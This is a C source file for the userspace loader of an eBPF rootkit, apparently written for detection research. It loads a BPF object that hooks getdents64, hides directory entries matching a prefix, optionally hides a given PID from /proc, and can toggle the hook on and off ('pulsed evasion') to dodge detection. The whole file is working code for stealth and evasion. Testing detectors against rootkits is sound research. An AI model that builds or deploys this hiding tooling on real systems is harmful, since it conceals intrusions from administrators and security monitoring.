// SPDX-License-Identifier: GPL-2.0
/*
 * rootkit.c - userspace loader / controller for the adversarial eBPF rootkit.
 *
 * Loads rootkit.bpf.o, writes the hide policy into the config map, and exposes
 * a tiny control surface so evaluation scenarios can switch hiding on and off
 * at runtime (pulsed evasion) or hide a specific PID.
 *
 * Usage:
 *   sudo ./rootkit --prefix rootkit_ [--hide-pid N] [--pulse MS]
 *
 * With --pulse the hook is toggled every MS milliseconds to emulate an
 * intermittently-unhooking rootkit. Ctrl-C detaches cleanly.
 */
#include <argp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "rootkit.skel.h"

static volatile sig_atomic_t stop;
static void on_sigint(int sig) { stop = 1; }

static struct env {
	const char *prefix;
	unsigned int hide_pid;
	unsigned int pulse_ms;   /* 0 = steady-on */
} env = { .prefix = "rootkit_", .hide_pid = 0, .pulse_ms = 0 };

const char *argp_program_version = "rootkit 1.0";
static const char doc[] =
	"Adversarial getdents64 hiding rootkit (research use only). See SAFETY.md.";
static const struct argp_option opts[] = {
	{ "prefix",   'p', "STR", 0, "Hide dir entries starting with STR" },
	{ "hide-pid", 'i', "PID", 0, "Also hide this PID from /proc" },
	{ "pulse",    'u', "MS",  0, "Toggle the hook every MS ms (pulsed evasion)" },
	{},
};
static error_t parse_opt(int key, char *arg, struct argp_state *state)
{
	switch (key) {
	case 'p': env.prefix = arg; break;
	case 'i': env.hide_pid = strtoul(arg, NULL, 10); break;
	case 'u': env.pulse_ms = strtoul(arg, NULL, 10); break;
	default: return ARGP_ERR_UNKNOWN;
	}
	return 0;
}
static const struct argp argp = { opts, parse_opt, NULL, doc };

static int write_cfg(struct rootkit_bpf *skel, unsigned int enabled)
{
	struct rk_config cfg = {};
	__u32 key = 0;

	cfg.enabled = enabled;
	cfg.hide_pid = env.hide_pid;
	strncpy(cfg.prefix, env.prefix, MAX_NAME_LEN - 1);
	cfg.prefix_len = strlen(cfg.prefix);
	return bpf_map__update_elem(skel->maps.rk_cfg, &key, sizeof(key),
				    &cfg, sizeof(cfg), BPF_ANY);
}

int main(int argc, char **argv)
{
	struct rootkit_bpf *skel;
	int err;

	err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
	if (err)
		return err;

	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
	skel = rootkit_bpf__open_and_load();
	if (!skel) {
		fprintf(stderr, "failed to open/load BPF skeleton\n");
		return 1;
	}
	err = rootkit_bpf__attach(skel);
	if (err) {
		fprintf(stderr, "failed to attach: %d\n", err);
		goto cleanup;
	}
	if (write_cfg(skel, 1)) {
		fprintf(stderr, "failed to write config\n");
		goto cleanup;
	}

	signal(SIGINT, on_sigint);
	signal(SIGTERM, on_sigint);
	printf("[rootkit] active: prefix=\"%s\" hide_pid=%u pulse=%ums\n",
	       env.prefix, env.hide_pid, env.pulse_ms);
	printf("[rootkit] Ctrl-C to detach.\n");

	unsigned int enabled = 1;
	while (!stop) {
		if (env.pulse_ms) {
			usleep(env.pulse_ms * 1000);
			enabled ^= 1;
			write_cfg(skel, enabled);
		} else {
			sleep(1);
		}
	}
	write_cfg(skel, 0);
	printf("\n[rootkit] detached.\n");

cleanup:
	rootkit_bpf__destroy(skel);
	return err != 0;
}
